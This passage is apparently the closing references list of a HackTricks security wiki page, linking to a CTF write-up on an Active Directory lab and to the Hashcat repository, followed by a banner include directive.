- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
